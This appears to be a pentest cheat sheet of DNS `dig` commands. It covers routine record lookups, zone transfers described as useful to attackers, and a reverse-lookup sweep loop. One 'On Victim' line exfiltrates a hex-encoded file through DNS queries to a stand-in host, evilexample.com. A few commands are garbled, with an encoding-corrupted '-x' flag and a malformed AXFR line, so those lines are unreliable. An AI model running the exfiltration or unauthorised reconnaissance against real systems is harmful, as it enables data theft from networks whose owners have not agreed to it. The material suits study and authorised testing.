# [dig](https://linux.die.net/man/1/dig) commands

- The `dig` command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records
- A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target's DNS infrastructure, including subdomains, IP addresses and name server records. If the server is misconfigured and allows the transfer, you'll receive a complete list of DNS records for the domain, including all subdomains.

- Performs a default A record lookup for the domain. - `dig domain.com` 
- Retrieves the IPv4 address (A record) associated with the domain. - `dig domain.com A` 
- Retrieves the IPv6 address (AAAA record) associated with the domain. - `dig domain.com AAAA` 
- Finds the mail servers (MX records) responsible for the domain - `dig domain.com MX` 
- Identifies the authoritative name servers for the domain - `dig domain.com NS` 
- Retrieves any TXT records associated with the domain - `dig domain.com TXT` 
- Retrieves the canonical name (CNAME) record for the domain - `dig domain.com CNAME`
- Retrieves the start of authority (SOA) record for the domain - `dig domain.com SOA` 
- Specifies a specific name server to query; in this case 1.1.1.1 - `dig @1.1.1.1 domain.com` 
- Shows the full path of DNS resolution - `dig +trace domain.com` 
- Performs a reverse lookup on the IP address 192.168.1.1 to find the associated hostname. You may need to specify a name server - `dig -x 192.168.1.1` 
- Provides a short, concise answer to the query. - `dig +short domain.com` 
- Displays only the answer section of the query output. - `dig +noall +answer domain.com` 
- Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). - `dig domain.com ANY` 
- Reverse domain lookup - `dig -x <IP_ADDRESS>` 
- DNS zone transfer - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` (axfr is the zone transfer request)
- DNS reverse lookup (Replace first three octets of IP to set class C address to scan) - `for ip in {1..254..1}; do dig â€“x 1.1.1.$ip \| grep $ip >> dns.txt; done;`
- On Victim: Read in each line and do a DNS lookup - `for b in `cat file.hex `; do dig $b.shell.evilexample.com; done`
- Lookup domain by IP - `dig -x <ip>`
- Host transfer - `dig @ <ip> <domain> it AXFR`

**Caution**: Some servers can detect and block excessive DNS queries. Use caution and respect rate limits. Always obtain permission before performing extensive DNS reconnaissance on a target.
